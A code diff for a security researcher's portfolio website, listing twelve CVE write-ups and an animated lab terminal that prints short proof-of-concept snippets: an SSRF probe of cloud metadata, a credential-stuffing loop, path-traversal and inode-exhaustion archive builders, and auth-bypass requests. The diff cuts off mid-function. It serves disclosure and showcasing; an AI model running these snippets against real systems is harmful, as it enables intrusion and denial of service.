+updateProgress();
+
+/* ====== TYPEWRITER HERO ====== */
+var ROLES = ['Security Researcher','Penetration Tester','Cloud & DevOps Engineer','SSRF & IDOR Specialist'];
+var tw = document.getElementById('typewriter');
+var rI = 0, cI = 0, del = false;
+function tick() {
+  var full = ROLES[rI];
+  if (!del) {
+    tw.textContent = full.slice(0, ++cI);
+    if (cI === full.length) { del = true; setTimeout(tick, 1800); return; }
+  } else {
+    tw.textContent = full.slice(0, --cI);
+    if (cI === 0) { del = false; rI = (rI + 1) % ROLES.length; }
+  }
+  setTimeout(tick, del ? 35 : 65);
+}
+tick();
+
+/* ====== REVEAL ON SCROLL ====== */
+var revealObserver = new IntersectionObserver(function(entries) {
+  entries.forEach(function(e) {
+    if (e.isIntersecting) {
+      e.target.classList.add('revealed');
+      revealObserver.unobserve(e.target);
+    }
+  });
+}, {threshold: 0.12});
+
+function observeReveals() {
+  document.querySelectorAll('.card:not(.revealed), .adv-card:not(.revealed), .exp-card:not(.revealed)').forEach(function(c) {
+    revealObserver.observe(c);
+  });
+}
+
+function esc(s) {
+  return (s || '').replace(/[&<>"']/g, function(c) {
+    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
+  });
+}
+
+/* ====== 12 CVEs ====== */
+var MY_CVES = [
+  {id:'CVE-2026-43763',sev:'medium',tag:'Apple',title:'Sandbox file-read via permissions issue (ATS)',
+   desc:'A permissions issue in Apple macOS ATS allowed sandboxed file-read access. Fixed across macOS Tahoe, Sequoia, and Sonoma. Co-credited by Apple to Pavan Nallamothu and Jared Reyes.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-43763',meta:'Fixed: Tahoe · Sequoia · Sonoma'},
+  {id:'CVE-2026-63013',sev:'high',tag:'NSA skills-service',title:'Privilege escalation via unauthorized admin-group assignment',
+   desc:'Three admin-group assignment endpoints grant admin roles with no caller-authorization check. Any authenticated user takes over any project, quiz, or global badge, reading and destructively deleting data. CVSS 8.8.',
+   url:'https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-67x3-r85f-822r',meta:'High (8.8) · NSA · CVE assigned, MITRE record pending'},
+  {id:'CVE-2026-63014',sev:'medium',tag:'NSA skills-service',title:'Cross-project IDOR in validateCopy endpoint',
+   desc:'A non-greedy regex in the authorization filter matches only the first projects/{id} segment, letting any project admin enumerate subject IDs and read subject/skill names across tenant boundaries.',
+   url:'https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-p527-vjfp-c43p',meta:'Moderate · NSA · CVE assigned, MITRE record pending'},
+  {id:'CVE-2026-63177',sev:'high',tag:'CISA Malcolm',title:'Authorization bypass via URI-normalization differential (RBAC)',
+   desc:'A URI-normalization differential between the reverse proxy and the application backend allows an authenticated user to bypass ROLE_UPLOAD checks and reach the upload/processing endpoint without the required role.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-63177',meta:'High · Credited: CISA'},
+  {id:'CVE-2026-63134',sev:'medium',tag:'CISA Malcolm',title:'Path traversal in archive extraction',
+   desc:'safe-extract.py protects file entries with libarchive secure flags but creates directory entries with raw os.makedirs(), no traversal protection, allowing arbitrary directory creation outside the extraction root.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-63134',meta:'Credited: CISA'},
+  {id:'CVE-2026-63133',sev:'medium',tag:'CISA Malcolm',title:'Uncontrolled resource consumption (inode-exhaustion DoS)',
+   desc:'No cap on archive entry count, depth, or uncompressed size. A small malicious archive exhausts inodes, crashing the filebeat processing pipeline and blinding the SOC\'s network-visibility tool.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-63133',meta:'Credited: CISA'},
+  {id:'CVE-2026-33234',sev:'medium',tag:'AutoGPT',title:'SSRF via user-controlled SMTP server (IP-blocklist bypass)',
+   desc:'SendEmailBlock passes user-supplied smtp_server/smtp_port straight to smtplib.SMTP() with no IP validation, completely bypassing the platform\'s validate_url_host() + BLOCKED_IP_NETWORKS blocklist. CVSS 5.0.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-33234',meta:'Moderate (5.0) · Versions 0.1.0-0.6.51'},
+  {id:'CVE-2026-50023',sev:'high',tag:'yt-dlp',title:'Dangerous file creation via filename-sanitization bypass',
+   desc:'The CVE-2024-38519 allowlist kept .desktop, .url, .webloc for --write-link, letting a remote attacker write malicious OS-shortcut files during media/subtitle downloads. Bypasses the prior fix. CVSS 8.3.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-50023',meta:'High (8.3) · Fixed: 2026.06.09'},
+  {id:'CVE-2026-40588',sev:'high',tag:'BlueprintUE',title:'Account takeover via password change without current-password check',
+   desc:'The password change flow does not verify the current password before accepting a new one. An attacker with a momentary session (XSS, sidejacking, physical access) can change the victim\'s password and take over the account permanently.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-40588',meta:'High · Fixed: 4.2.0'},
+  {id:'CVE-2026-40586',sev:'high',tag:'BlueprintUE',title:'Missing brute-force protection on login',
+   desc:'The login form handler performs no throttling of any kind. No IP-based rate limiting, lockout, or per-account counter. Enables unlimited brute force, dictionary attacks, and credential stuffing.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-40586',meta:'Fixed: 4.2.0'},
+  {id:'CVE-2026-40585',sev:'medium',tag:'BlueprintUE',title:'Non-expiring password-reset tokens',
+   desc:'findUserIDFromEmailAndToken() queries only email+token, never checking the password_reset_at timestamp. A 128-char CSPRNG reset token stays valid forever until consumed or overwritten.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-40585',meta:'Fixed: 4.2.0'},
+  {id:'CVE-2026-40587',sev:'medium',tag:'BlueprintUE',title:'Insufficient session expiration after credential change',
+   desc:'Password change and reset flows update only the password column, they never destroy active sessions. A compromised session retains full access even after the victim changes their password.',
+   url:'https://www.cve.org/CVERecord?id=CVE-2026-40587',meta:'Fixed: 4.2.0'}
+];
+
+document.getElementById('cve-grid').innerHTML = MY_CVES.map(function(c) {
+  var titleShort = c.title.length > 55 ? c.title.slice(0,53) + '…' : c.title;
+  return '<article class="card">' +
+    '<span class="card-tag">' + c.tag + '</span>' +
+    '<h3><a href="' + c.url + '" target="_blank" rel="noopener" style="color:inherit">' + c.id + '</a> ' +
+    '<span class="sev ' + c.sev + '" style="margin-left:6px">' + c.sev + '</span></h3>' +
+    '<p>' + esc(c.desc) + '</p>' +
+    '<div class="card-meta"><span>' + esc(titleShort) + '</span><span>' + c.meta + ' →</span></div>' +
+  '</article>';
+}).join('');
+observeReveals();
+
+/* ====== ADVISORIES (static data, no fetch) ====== */
+var ADV_DATA = [
+  {id:'GHSA-67x3-r85f-822r',cve:'CVE-2026-63013',sev:'high',repo:'NSA/skills-service',
+   summary:'Privilege escalation: admin-group assignment endpoints grant admin roles with no caller-authorization check. Any authenticated user takes over any project, quiz, or global badge.',
+   html:'https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-67x3-r85f-822r'},
+  {id:'GHSA-p527-vjfp-c43p',cve:'CVE-2026-63014',sev:'medium',repo:'NSA/skills-service',
+   summary:'Cross-project IDOR in the validateCopy endpoint. A non-greedy regex authorizes only the first projects/{id} segment, letting any project admin enumerate subject IDs across tenant boundaries.',
+   html:'https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-p527-vjfp-c43p'},
+  {id:'GHSA-m5fr-rv3h-xg2r',cve:'CVE-2026-63177',sev:'high',repo:'cisagov/Malcolm',
+   summary:'Authorization bypass via URI-normalization differential (RBAC). Lets any authenticated user reach the upload/processing endpoint without ROLE_UPLOAD.',
+   html:'https://github.com/cisagov/Malcolm/security/advisories/GHSA-m5fr-rv3h-xg2r'},
+  {id:'GHSA-65mm-vgrw-vqx4',cve:'CVE-2026-63134',sev:'medium',repo:'cisagov/Malcolm',
+   summary:'Path traversal in safe-extract.py archive extraction. Directory entries are created with raw os.makedirs(), no traversal protection, allowing arbitrary directory creation outside the extraction root.',
+   html:'https://github.com/cisagov/Malcolm/security/advisories/GHSA-65mm-vgrw-vqx4'},
+  {id:'GHSA-c35g-mgc3-95rx',cve:'CVE-2026-63133',sev:'medium',repo:'cisagov/Malcolm',
+   summary:'Uncontrolled resource consumption in archive extraction. No cap on entry count or uncompressed size, a small malicious archive exhausts inodes and blinds the SOC\'s network-visibility pipeline.',
+   html:'https://github.com/cisagov/Malcolm/security/advisories/GHSA-c35g-mgc3-95rx'}
+];
+
+/* advisories section removed from page; ADV_DATA retained for the terminal 'advisories'/'adv' commands */
+
+/* ====== EXPERIENCE ====== */
+var EXPERIENCE = [
+  {role:'CTF Committee, Web Challenge Author & Infrastructure',org:'ISC2 New Jersey Chapter',dates:'May 2024 - Present',
+   bullets:[
+     'Author real-world web-exploitation challenges for CTF events run for hundreds of students and career changers.',
+     'Design and operate AWS-hosted CTF infrastructure: CTFd platform, domain hosting, SSL/TLS, high availability.',
+     'Monitor security and system logs during events, resolving incidents in real time.',
+     'Committee member for SECON NJ 2026 (450+ attendees, Kean University).'
+   ]},
+  {role:'IT Services Help Desk, Student Representative',org:'Pace University, Pleasantville, NY',dates:'Oct 2023 - Jul 2025',
+   bullets:[
+     'First-line technical support for the campus community across software, hardware, network, and account issues.',
+     'Advised users on digital-security best practices, applying cybersecurity coursework to real support workflows.',
+     'Handled sensitive user data with strict confidentiality and integrity requirements.'
+   ]},
+  {role:'Systems Engineer',org:'VLEAD, SERC, IIIT Hyderabad',dates:'Nov 2018 - May 2023',
+   bullets:[
+     'Built and operated scalable AWS + on-premise infrastructure for the Virtual Labs initiative (Ministry of Education, Govt. of India), serving thousands of students.',
+     'Deployed and managed 80+ virtual servers, sustaining 99.9% uptime.',
+     'Designed and maintained CI/CD pipelines for production and staging environments.',
+     'Detected and remediated 10+ network/infrastructure vulnerabilities through manual and automated testing.',
+     'Managed SSL/TLS certificate lifecycle across production and test domains.'
+   ]}
+];
+
+document.getElementById('exp-grid').innerHTML = EXPERIENCE.map(function(e) {
+  return '<article class="exp-card">' +
+    '<div class="exp-role">' + esc(e.role) + '</div>' +
+    '<div class="exp-org">' + esc(e.org) + '</div>' +
+    '<div class="exp-dates">' + e.dates + '</div>' +
+    '<ul>' + e.bullets.map(function(b) { return '<li>' + esc(b) + '</li>'; }).join('') + '</ul>' +
+  '</article>';
+}).join('');
+observeReveals();
+
+/* ====== CERTIFICATIONS ====== */
+var CERTS = [
+  'Fortinet NSE 3 Certified in Cybersecurity',
+  'Jr Penetration Tester (TryHackMe)',
+  'CompTIA Pentest+ Learning Path (TryHackMe)',
+  'Certified Entry-Level Python Programmer',
+  'Cybersecurity Essentials (Cisco)',
+  'Cisco Networking Essentials',
+  'IT Security: Defense Against the Digital Dark Arts (Google)',
+  'Google IT Support Professional Certificate',
+  'AWS Fundamentals Specialization',
+  'DevOps with AWS',
+  'Automation Scripts Using Bash',
+  'Statistical Analysis using R',
+  'INSPIRE Program (Pace University)',
+  '38th Mathematical Olympiad',
+  'ISC2 Candidate'
+];
+document.getElementById('cert-grid').innerHTML = CERTS.map(function(c) {
+  return '<div class="cert-item">' + esc(c) + '</div>';
+}).join('');
+
+/* ====== COMMUNITY ====== */
+var COMMUNITY = [
+  {org:'ISC2 New Jersey Chapter',role:'Member · CTF Committee',desc:'Authoring web-exploitation challenges for CTF events.'},
+  {org:'CySAP Africa',role:'Panelist / Speaker',desc:'"Inside the Hacker\'s Mind", the human element in security.'},
+  {org:'National Cyber League',role:'CTF Competitor',desc:'Fall 2023 cohort, 7,800+ players.'},
+  {org:'DebConf21',role:'Speaker',desc:'"GUI vs CLI in Debian" presentation.'},
+  {org:'Swecha (NPO)',role:'Mentor',desc:'IoT, AR/VR, and Data Science workshops.'},
+  {org:'Mozilla Internet Health Hackathon \'19',role:'Organizer',desc:'Organized hackathon focused on internet health.'}
+];
+document.getElementById('community-grid').innerHTML = COMMUNITY.map(function(c) {
+  return '<div class="community-item">' +
+    '<div class="ci-org">' + esc(c.org) + '</div>' +
+    '<div class="ci-role">' + esc(c.role) + '</div>' +
+    '<div class="ci-desc">' + esc(c.desc) + '</div>' +
+  '</div>';
+}).join('');
+
+/* ====== LAB TABS ====== */
+var LAB_SCRIPTS = [
+  {
+    title:'pavan@lab: ~/poc/autogpt-ssrf',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-33234 --target autogpt@0.6.51'},
+      {t:'boot',s:'[+] loading autogpt_platform/backend/blocks/email_block.py'},
+      {t:'ok',s:'[+] SendEmailBlock located, smtp_server/smtp_port are user inputs'},
+      {t:'warn',s:'[!] validate_url_host() NOT called on this path'},
+      {t:'boot',s:'[+] crafting payload, bypass BLOCKED_IP_NETWORKS via SMTP'},
+      {t:'acc',s:''},
+      {t:'code',s:'import smtplib\n\n# AutoGPT passes these straight to smtplib.SMTP()\n# with NO IP validation, every other block runs validate_url_host()\n# against BLOCKED_IP_NETWORKS. This one doesn\'t.\n\ntargets = [\n    ("169.254.169.254", 25),   # AWS IMDSv1\n    ("metadata.google.internal", 80),  # GCP\n    ("127.0.0.1", 6379),       # Redis\n]\n\nfor host, port in targets:\n    try:\n        s = smtplib.SMTP(host, port, timeout=5)\n        print(f"[HIT] {host}:{port} -> reachable")\n        s.quit()\n    except Exception as e:\n        print(f"[miss] {host}:{port} -> {e}")'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/blueprintue-brute',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-40586 --target blueprintUE@<4.2.0'},
+      {t:'boot',s:'[+] targeting login endpoint /login'},
+      {t:'warn',s:'[!] no rate limiting detected, full network speed'},
+      {t:'warn',s:'[!] no lockout, no IP ban, no per-account counter'},
+      {t:'ok',s:'[+] starting credential stuffing attack'},
+      {t:'acc',s:''},
+      {t:'code',s:'import requests\n\n# No throttling of any kind.\n# Failed auth processes at full network speed.\n# Enables brute force, dictionary attacks, credential stuffing.\n\nurl = "https://blueprintue.com/login"\nwordlist = ["admin", "password", "123456", "letmein", "welcome"]\n\nfor pwd in wordlist:\n    r = requests.post(url, data={\n        "email": "victim@example.com",\n        "password": pwd\n    })\n    if "Invalid" not in r.text:\n        print(f"[+] FOUND: {pwd}")\n        break\n    # No delay, server responds instantly to unlimited attempts'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/ytdlp-filewrite',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-50023 --target yt-dlp@<2026.06.09'},
+      {t:'boot',s:'[+] analyzing --write-link allowlist'},
+      {t:'warn',s:'[!] .desktop, .url, .webloc are in the allowlist'},
+      {t:'warn',s:'[!] these are executable OS shortcuts!'},
+      {t:'ok',s:'[+] crafting malicious media URL'},
+      {t:'acc',s:''},
+      {t:'code',s:'# CVE-2024-38519 fix added an extension allowlist\n# But kept .desktop, .url, .webloc for --write-link\n# These bypass the fix and write executable shortcuts.\n\n# yt-dlp --write-link "https://evil.com/payload.url"\n# Creates payload.url pointing to malware\n\n# The .url file contains:\n# [InternetShortcut]\n# URL=file:///path/to/malware.exe\n# or URL=powershell://...'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/malcolm-pathtraversal',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --ghsa GHSA-65mm-vgrw-vqx4 --target cisagov/Malcolm'},
+      {t:'boot',s:'[+] analyzing safe-extract.py'},
+      {t:'warn',s:'[!] files protected by libarchive EXTRACT_SECURE flags'},
+      {t:'warn',s:'[!] directory entries use raw os.makedirs(), NO protection'},
+      {t:'ok',s:'[+] crafting malicious archive with traversal path'},
+      {t:'acc',s:''},
+      {t:'code',s:'import tarfile\n\n# safe-extract.py protects files with libarchive flags:\n#   EXTRACT_SECURE_NODOTDOT | EXTRACT_SECURE_NOABSOLUTEPATHS\n# But directory entries bypass this entirely:\n#   if entry.isdir:\n#       os.makedirs(os.path.join(dest, entry.pathname))\n\nwith tarfile.open("evil.tar", "w") as t:\n    di = tarfile.TarInfo("../../../../../../tmp/CIPHER_DIR_PWNED")\n    di.type = tarfile.DIRTYPE\n    di.mode = 0o755\n    t.addfile(di)\n\n# Upload to Malcolm -> creates /tmp/CIPHER_DIR_PWNED\n# outside the extraction directory.'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/malcolm-rbac-bypass',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-63177 --target cisagov/Malcolm'},
+      {t:'boot',s:'[+] analyzing URI normalization differential'},
+      {t:'warn',s:'[!] reverse proxy normalizes /upload/../admin/ -> /admin'},
+      {t:'warn',s:'[!] backend sees the raw /upload/../admin/ path'},
+      {t:'ok',s:'[+] ROLE_UPLOAD check passes on /upload, request reaches /admin'},
+      {t:'acc',s:''},
+      {t:'code',s:'import requests\n\n# Malcolm\'s reverse proxy normalizes URIs differently\n# from the backend application. A path like:\n#   /upload/../admin/process-pcap\n# is rewritten by the proxy to /admin/process-pcap\n# but the backend sees the original /upload/ prefix,\n# passing the ROLE_UPLOAD check while reaching admin endpoints.\n\nurl = "https://malcolm.example.com/upload/../admin/process-pcap"\nheaders = {"Authorization": "Bearer <valid_auth_token>"}\n\n# Attacker has any authenticated session (not ROLE_UPLOAD)\nr = requests.post(url, headers=headers, files={\n    "file": ("evil.pcap", open("evil.pcap","rb").read())\n})\nprint(f"Status: {r.status_code}")\n# 200, upload processed despite missing ROLE_UPLOAD role'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/apple-ats-sandbox',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-43763 --target macOS/ATS'},
+      {t:'boot',s:'[+] Apple Type Services (ATS) permissions issue'},
+      {t:'warn',s:'[!] sandboxed process can reach files outside its container'},
+      {t:'ok',s:'[+] Fixed across macOS Tahoe, Sequoia, and Sonoma'},
+      {t:'acc',s:''},
+      {t:'code',s:'# CVE-2026-43763: permissions issue in Apple ATS\n# A sandboxed app gains file-read access it should not have.\n#\n# The type-service path resolves a user-influenced path without\n# re-checking the sandbox container boundary, so a read meant\n# for the app container reaches files outside it.\n\n# Sandboxed context (com.apple.security.app-sandbox = true)\nopen("/Users/victim/Library/Mail/protected", O_RDONLY)\n#  pre-patch:  succeeds via the ATS path\n#  post-patch: EPERM (blocked)\n\n# Credit: Pavan Nallamothu, Jared Reyes (Apple security content)'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/nsa-skills-privesc',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-63013 --target NSA/skills-service'},
+      {t:'boot',s:'[+] targeting admin-group assignment endpoints'},
+      {t:'warn',s:'[!] no caller-authorization check on the role grant'},
+      {t:'ok',s:'[+] any auth user -> admin over any project/quiz/badge (CVSS 8.8)'},
+      {t:'acc',s:''},
+      {t:'code',s:'import requests\n\n# Three admin-group assignment endpoints perform NO\n# authorization check on the caller. Any logged-in user\n# can grant themselves admin over any project, quiz, or\n# global badge, then read and destructively delete data.\n\nbase = "https://skills.example.gov"\nsess = {"Cookie": "session=<any_low_priv_user>"}\n\nrequests.post(\n    f"{base}/admin/projects/VICTIM_PROJ/admins/attacker",\n    headers=sess)\n# 200 OK -> attacker is now admin of VICTIM_PROJ'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/nsa-skills-idor',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-63014 --target NSA/skills-service'},
+      {t:'boot',s:'[+] analyzing the validateCopy authorization filter'},
+      {t:'warn',s:'[!] non-greedy regex authorizes only the first projects/{id}'},
+      {t:'ok',s:'[+] cross-tenant read of subject and skill names'},
+      {t:'acc',s:''},
+      {t:'code',s:'# The authz filter regex:  /projects/([^/]+?)/...\n# is non-greedy and anchors on the FIRST projects/{id}.\n#\n# Supply two project segments: the filter authorizes on\n# YOUR project, the handler operates on the victim project.\n\nGET /admin/projects/MY_PROJ/validateCopy\n    ?fromProjectId=VICTIM_PROJ&subjectId=1\n\n#  filter sees MY_PROJ        -> authorized\n#  handler reads VICTIM_PROJ  -> cross-project IDOR'}
+    ]
+  },
+  {
+    title:'pavan@lab: ~/poc/malcolm-inode-dos',
+    lines:[
+      {t:'boot',s:'$ ./reproduce --cve CVE-2026-63133 --target cisagov/Malcolm'},
+      {t:'boot',s:'[+] crafting a tiny archive with millions of entries'},
+      {t:'warn',s:'[!] no cap on entry count, depth, or uncompressed size'},
+      {t:'err',s:'[!] inode exhaustion -> filebeat pipeline crash (SOC blinded)'},
+      {t:'acc',s:''},
+      {t:'code',s:'import tarfile, io\n\n# safe-extract.py enforces no limit on entry count.\n# A few-MB compressed archive expands into millions of\n# empty files, exhausting inodes on the extraction volume\n# and crashing the network-visibility pipeline.\n\nbuf = io.BytesIO()\nwith tarfile.open(fileobj=buf, mode="w:gz") as t:\n    for i in range(5000000):\n        ti = tarfile.TarInfo(f"d/{i}")\n        ti.size = 0\n        t.addfile(ti)\n\n# small on disk -> exhausts inodes on unpack\n# Malcolm SOC loses network visibility (DoS)'}
+    ]
+  }
+];
+
+var labTitle = document.getElementById('lab-title');
+var termBody = document.getElementById('termBody');
+var labActiveIdx = 0;
+var labRunId = 0;
+
+function waitMs(ms, runId) {
+  return new Promise(function(resolve) {
+    var start = Date.now();
+    var check = function() {
+      if (runId !== labRunId) return resolve();
+      if (Date.now() - start >= ms) return resolve();
+      setTimeout(check, 16);
+    };
+    check();
+  });
+}
+
+function typeLine(text, isCode, runId) {
+  return new Promise(function(resolve) {
+    var wrap = document.createElement('div');
+    var script = LAB_SCRIPTS[labActiveIdx];
+    var found = script.lines.find(function(l) { return l.s === text; });
+    wrap.className = isCode ? 'acc' : (found ? found.t : 'boot');
+    var cursor = termBody.querySelector('.cursor');
+    if (!cursor) { resolve(); return; }
+    termBody.insertBefore(wrap, cursor);
+
+    var idx = 0;
+    function typeChar() {
+      if (runId !== labRunId) { resolve(); return; }
+      if (idx >= text.length) { resolve(); return; }
+      var ch = text[idx];
+      if (isCode && ch === '\n') {
+        var newDiv = document.createElement('div');
+        newDiv.className = 'acc';
+        var cur = termBody.querySelector('.cursor');
+        if (cur) termBody.insertBefore(newDiv, cur);
+        wrap = newDiv;
+      } else {
+        wrap.textContent += ch;
+      }
+      idx++;
+      setTimeout(typeChar, isCode ? 18 : 12);
+    }
+    typeChar();
+  });
+}
+
+function runLab(idx) {
+  labRunId++;
+  var thisRunId = labRunId;
+  labActiveIdx = idx;
+  var script = LAB_SCRIPTS[idx];
+  labTitle.textContent = script.title;
+  termBody.innerHTML = '<span class="cursor"></span>';
+
+  var lineIdx = 0;
+  function processNextLine() {
+    if (thisRunId !== labRunId) return;
+    if (lineIdx >= script.lines.length) return;
+    var line = script.lines[lineIdx];
+    lineIdx++;
+
+    if (line.t === 'code') {
+      typeLine(line.s, true, thisRunId).then(function() {
+        if (thisRunId !== labRunId) return;
+        processNextLine();
+      });
+    } else {
+      typeLine(line.s, false, thisRunId).then(function() {
+        if (thisRunId !== labRunId) return;
+        waitMs(380, thisRunId).then(function() {
+          if (thisRunId !== labRunId) return;
+          processNextLine();
+        });
+      });
+    }
+  }
+  processNextLine();
+}
+
+var initialLabIndex = Math.floor(Math.random() * LAB_SCRIPTS.length);
+document.querySelectorAll('#lab-tabs .lab-tab').forEach(function(tab) {
+  tab.classList.toggle('active', parseInt(tab.dataset.lab) === initialLabIndex);
+});
+
+document.getElementById('lab-tabs').addEventListener('click', function(e) {
+  var btn = e.target.closest('.lab-tab');
+  if (!btn) return;
+  document.querySelectorAll('.lab-tab').forEach(function(t) { t.classList.remove('active'); });
+  btn.classList.add('active');
+  runLab(parseInt(btn.dataset.lab));
+});
+
+var labStarted = false;
+var labIO = new IntersectionObserver(function(entries) {
+  if (entries[0].isIntersecting && !labStarted) {
+    labStarted = true;
+    labIO.disconnect();
+    runLab(initialLabIndex);
+  }
+}, {threshold: 0.3});
+if (termBody) labIO.observe(termBody);
+
+/* ====== INTERACTIVE TERMINAL ====== */
+var cliInput = document.getElementById('cli-input');
+var cliOutput = document.getElementById('cli-output');
+var cliBody = document.getElementById('cli-body');
+var cmdHistory = [];
+var historyIdx = -1;
+var matrixEnabled = true;
+
+var BANNER_HTML = '<div style="font-family:JetBrains Mono,monospace;font-size:1.6rem;font-weight:700;color:var(--accent);letter-spacing:.2em;padding:8px 0;text-align:center">P A V A N</div>' +
+  '<div style="text-align:center;color:var(--text-muted);margin-top:4px;font-size:.85rem">Pavan Nallamothu, Security Researcher · Penetration Tester</div>' +
+  '<div style="text-align:center;color:var(--text-muted);margin-top:4px;font-size:.8rem">12 CVEs · Apple · CISA · NSA · Type \'help\' for commands.</div>';
+
+var NEOFETCH_ASCII = '\n                    /\\\n                   /  \\\n                  /    \\\n                 /  ,,  \\\n                /  /  \\  \\\n               /  /    \\  \\\n              /  /      \\  \\\n             /__/        \\__\\\n             \\  \\        /  /\n              \\  \\      /  /\n               \\  \\    /  /\n                \\  \\  /  /\n                 \\  \\/  /\n                  \\____/';
+
+var COMMANDS = {
+  help: function() {
+    return '<span class="acc">Available commands:</span>\n\n' +
+      ' <span class="acc">Navigation</span>    <span class="acc">CVE Operations</span>     <span class="acc">Tools</span>        <span class="acc">Career</span>\n' +
+      '  ls               cves                   scan <host>    experience\n' +
+      '  cd <section>     cve <id>               nmap <host>   education\n' +
+      '  cat <file>       advisories             ping <host>   certs\n' +
+      '  pwd              adv <ghsa>             hack <target> community\n' +
+      '  tree                                     whois <host>\n\n' +
+      ' <span class="acc">System</span>         <span class="acc">Info</span>                <span class="acc">Fun</span>\n' +
+      '  theme <name>    about                  banner\n' +
+      '  matrix [on|off] skills                  neofetch\n' +
+      '  clear / cls     social                  history\n' +
+      '  date            contact                 echo <text>\n' +
+      '  whoami          resume                  exit\n\n' +
+      '<span class="text-muted">Tip: TAB=autocomplete, arrows=history, |=pipe</span>';
+  },
+  whoami: function() { return '<span class="acc">pavan</span> (uid=1000, gid=1000, groups=security_researchers,vulnerability_research,isc2_nj,coordinated_disclosure)'; },
+  banner: function() { return BANNER_HTML; },
+  neofetch: function() {
+    var t = document.documentElement.getAttribute('data-theme');
+    return '<span class="cli-ascii">' + NEOFETCH_ASCII + '</span>' +
+      '<table class="cli-table">' +
+      '<tr><td>user</td><td>pavan@pavan-blog</td></tr>' +
+      '<tr><td>os</td><td>SecurityBlogOS 2.0</td></tr>' +
+      '<tr><td>kernel</td><td>6.6.6-hardened</td></tr>' +
+      '<tr><td>uptime</td><td>since 2024</td></tr>' +
+      '<tr><td>shell</td><td>bash 5.2 + coffee</td></tr>' +
+      '<tr><td>theme</td><td>' + t + '</td></tr>' +
+      '<tr><td>cves</td><td><span class="acc">12</span> published (MITRE)</td></tr>' +
+      '<tr><td>credits</td><td>Apple · CISA · NSA</td></tr>' +
+      '<tr><td>disclosure</td><td>HackerOne · Bugcrowd · Google VRP · Apple · Meta</td></tr>' +
+      '<tr><td>location</td><td>Jersey City, NJ</td></tr>' +
+      '<tr><td>education</td><td>M.S. Cybersecurity @ Pace University</td></tr>' +
+      '<tr><td>affiliation</td><td>ISC² NJ Chapter · CTF Committee</td></tr>' +
+      '</table>';
+  },
+  ls: function() {
+    return '<span class="acc">CVE_Portfolio/</span>  <span class="acc">Advisories/</span>  <span class="acc">Lab/</span>  <span class="acc">Experience/</span>  <span class="acc">Education/</span>  <span class="acc">Community/</span>  about.txt  skills.txt  social.txt  resume.txt  contact.txt';
+  },
+  pwd: function() { return '/home/guest/pavan-blog'; },
+  cd: function(args) {
+    if (!args[0]) return '/home/guest/pavan-blog';
+    var map = {'cve-portfolio':'cve-portfolio','cves':'cve-portfolio','advisories':'advisories','lab':'lab','experience':'experience','education':'education','community':'community'};
+    var target = map[args[0].toLowerCase().replace('/','')];
+    if (target) {
+      var el = document.getElementById(target);
+      if (el) el.scrollIntoView({behavior:'smooth'});
+      return '<span class="ok">→ ' + esc(args[0]) + '</span>';
+    }
+    return '<span class="err">cd: no such directory: ' + esc(args[0]) + '</span>';
+  },
+  cat: function(args) {
+    if (!args[0]) return '<span class="err">cat: missing file</span>';
+    var files = {
+      'about.txt': 'Pavan Nallamothu\nSecurity Researcher · Penetration Tester · Cloud & DevOps Engineer\nM.S. Cybersecurity @ Pace University\nJersey City, NJ\n\n12 published CVEs across Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE.\nActive on HackerOne, Bugcrowd, Google VRP, Apple, Meta.\n4+ years as cloud/DevOps engineer (AWS, Docker, Kubernetes, CI/CD).',
+      'skills.txt': 'Vulnerability Research: web pentesting, source-code auditing, auth/session analysis\nVuln Classes: IDOR/BOLA, SSRF, SQLi, SSTI/RCE, XSS, path traversal, deserialization\nTooling: Burp Suite, nmap, ffuf, sqlmap, Playwright, Semgrep, hashcat/john\nLanguages: Python, Bash, Go, JavaScript, C\nCloud: AWS (EC2, S3, VPC, Lambda, IAM), Azure, Docker, K8s, CI/CD',
+      'social.txt': 'LinkedIn:  https://linkedin.com/in/pavanchow\nGitHub:    https://github.com/pavanchow\nEmail:     pavankumarpre@gmail.com\nPhone:     (551) 229-5068',
+      'resume.txt': 'Resume: https://linkedin.com/in/pavanchow\n\n12 CVEs (MITRE), Apple, CISA, NSA, AutoGPT, yt-dlp, BlueprintUE\nM.S. Cybersecurity, Pace University (Graduate Merit Scholarship)\n4+ years Cloud/DevOps (AWS, Docker, K8s, CI/CD)\nISC² NJ Chapter, CTF Committee',
+      'contact.txt': 'Email:   pavankumarpre@gmail.com\nPhone:   (551) 229-5068\nLinkedIn: https://linkedin.com/in/pavanchow\nGitHub:   https://github.com/pavanchow'
+    };
+    var f = files[args[0]];
+    if (f) return esc(f);
+    return '<span class="err">cat: ' + esc(args[0]) + ': No such file</span>';
+  },
+  tree: function() {
+    return '<span class="acc">pavan-blog/</span>\n' +
+      '├── <span class="acc">CVE_Portfolio/</span> (12 CVEs)\n' +
